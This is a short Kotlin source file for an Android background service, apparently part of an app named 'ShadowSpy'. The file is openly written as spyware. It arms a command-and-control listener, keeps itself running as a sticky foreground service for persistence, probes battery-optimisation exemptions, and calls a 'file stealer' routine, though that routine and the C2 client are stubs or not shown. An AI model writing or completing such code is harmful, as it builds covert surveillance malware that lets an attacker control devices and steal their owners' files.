package com.shadow.spy

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.os.PowerManager
import android.util.Log

class StealthService : Service() {
    private val TAG = "ShadowSpy"
    private lateinit var c2: C2Client

    override fun onCreate() {
        super.onCreate()
        c2 = C2Client(this)
        c2.connectAndListen()
        Log.d(TAG, "C2 command listener armed")
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "StealthService started - persistence engaged")
        startForeground(1, NotificationHelper.createNotification(this))

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        val name = packageName
        if (!pm.isIgnoringBatteryOptimizations(name)) {
            // Handle whitelist
        }

        startFileStealer()
        return START_STICKY
    }

    private fun startFileStealer() {
        Log.d(TAG, "File stealer initialized")
    }
}